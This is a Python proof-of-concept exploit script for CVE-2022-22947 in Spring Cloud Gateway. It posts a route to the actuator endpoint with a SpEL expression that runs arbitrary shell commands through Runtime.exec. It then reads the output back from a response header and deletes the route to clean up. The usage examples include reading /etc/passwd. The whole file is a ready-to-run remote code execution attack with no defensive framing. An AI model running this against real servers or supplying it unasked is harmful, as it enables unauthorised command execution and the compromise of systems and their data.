#!/usr/bin/env python3
import requests
import sys
import random
import re


def usage():
    print("""
Usage:
    python3 CVE-2022-22947.py <URL> <CMD>

Example :
    python3 CVE-2022-22947.py http://127.0.0.1:8080 id
    python3 CVE-2022-22947.py http://127.0.0.1:8080 "cat /etc/passwd"
""")


def randStr():
    s = random.sample('abcdefghijklmnopqrstuvwxyz', 8)
    return ''.join(s)


def exploit(url, cmd):
    route_path = randStr()
    rce = url + "/actuator/gateway/routes/{0}".format(route_path)
    refresh = url + "/actuator/gateway/refresh"
    cmdlist = cmd.split(" ")
    command = "\"" + "\", \"".join(cmdlist) + "\""
    payload = {
        "id": route_path,
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{%s}).getInputStream()))}" % command
            }
        }],
        "uri": url
    }

    resp = requests.post(rce, json=payload)
    if resp.status_code != 201:
        print("[!] Create Route Error!")
        return
    
    resp = requests.post(refresh)
    resp = requests.get(rce)
    cmd_result = re.findall(r"Result\s=\s'(.+)']", resp.text)

    print(cmd_result[0].encode("utf-8").decode("unicode_escape"))


    resp = requests.delete(rce)
    if resp.status_code != 200:
        print("[!] Delete Route Error!")
    resp = requests.post(refresh)





if __name__ == "__main__":
    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        usage()
        exit()
    url = sys.argv[1]
    cmd = sys.argv[2]
    exploit(url, cmd)
    

    